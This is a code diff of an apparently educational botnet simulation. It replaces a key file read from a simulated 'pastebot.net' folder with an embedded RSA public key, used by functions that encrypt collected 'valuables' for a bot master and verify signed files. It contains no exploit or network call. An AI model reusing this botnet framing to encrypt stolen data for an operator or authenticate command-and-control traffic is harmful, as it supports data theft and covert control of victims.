@@ -11,8 +11,21 @@ from Crypto.Hash import SHA512
 
 #AES.key_size = (16,24,32)
 AES256_KEYSIZE_BYTES = AES.key_size[2]
-#Public Key Filename
-FN_PUBLIC_KEY = "public_key.pem"
+#Public Key
+PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAn+Pt6ImboK+c/7IlHd1k
+vGlo9mAMQ/M2n8QmvLtx5YA3bYTdcyl1fiAXDkknv742kAy4Mibps9iMHUgP9hQu
+irOuJOlEv00hAAzLsBpSFHycHC7PWvxbqM8ENzoRiekHUxN8lA9yMsPTcrwWzA0l
+ChQpOyGslFNGZq1cZIjDP9iiywXGxx5iPwwJNtmyMw6MP+AOJbLM4rChBWs9iqlF
+mqSlKIJ1cj7mTUvvaCc/VbwJxiixPW8nQC1ALEdwdMeLNP8ueOgXAc2X7qsvY5MG
+PdYl1aXLrmuIMft5hw/wKothKWuL/0DbazLbGUl2vZhkfa1DZ7EYPM3s6yiareIc
+Iwx6/sUyJMNcn5nN4Ri+1Js/vRHMMkNGT56iKGQkQHCks5uR38eoU9nluyP5jqmy
+wt2vx5zM3xc4mGZluh7kdjrbNuOJl9hEuajKfu+lfkW4Gpocc7B8kGAgya8lMu0u
+jEZ5wfUKW8UQLwMoBvOP02ZJcqdkuxoNkiAfii0HY+sRMxGzzTkPFp+xSEJ9bUC+
+dGrC1N+Em6Qzb7A72ZlkXgjeTWOlPxVUPhpyOSHsgEv5ybU7cv3R4pM3d+zxx0u8
+0JXDkcyY31jb+KdxQdApewTWUqH+Bz/srcip1PQ/9MZEDcXCVn+7UskCX7pDBQgl
+94Ws3BE90UMZ8Y/k3avKKyUCAwEAAQ==
+-----END PUBLIC KEY-----"""
 
 
 # Instead of storing files on disk,
@@ -29,8 +42,8 @@ def save_valuable(data):
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
 
-    #0. 'Download' Public Key from publically accessible pastebot.net
-    f_public_key = open(os.path.join("pastebot.net", FN_PUBLIC_KEY), "rb").read()
+    #0. Use the public key
+    public_key = PUBLIC_KEY
 
     #1. Setup AES Stuff
     #   8 byte (64bit) nonce/iv for CTR mode counter prefix.
@@ -50,7 +63,7 @@ def encrypt_for_master(data):
     #3. Setup RSA stuff
     #   Create a new RSA key instance with the imported
     #   public key
-    rsa_public_key = RSA.importKey(f_public_key)
+    rsa_public_key = RSA.importKey(public_key)
 
     #4. PKCS1_OAEP Encryption of Key
     #   New PKCS1_OAEP cipher instance with RSA public key
@@ -78,8 +91,8 @@ def upload_valuables_to_pastebot(fn):
 ###
 
 def verify_file(f):
-    #0. 'Download' Public Key from publically accessible pastebot.net
-    f_public_key = open(os.path.join("pastebot.net", FN_PUBLIC_KEY), "rb").read()
+    #0. Use the public key
+    public_key = PUBLIC_KEY
 
     #1. Get the signature
     #   The signature makes up the first 4096 or 512 bytes of the signed file...
@@ -89,7 +102,7 @@ def verify_file(f):
     #2. Setup RSA stuff
     #   Create a new RSA key instance with the imported
     #   public key
-    rsa_public_key = RSA.importKey(f_public_key)
+    rsa_public_key = RSA.importKey(public_key)
 
     #3. Instantiate a hash object of the acutal data
     #   so that its hash can be verified with the signature...
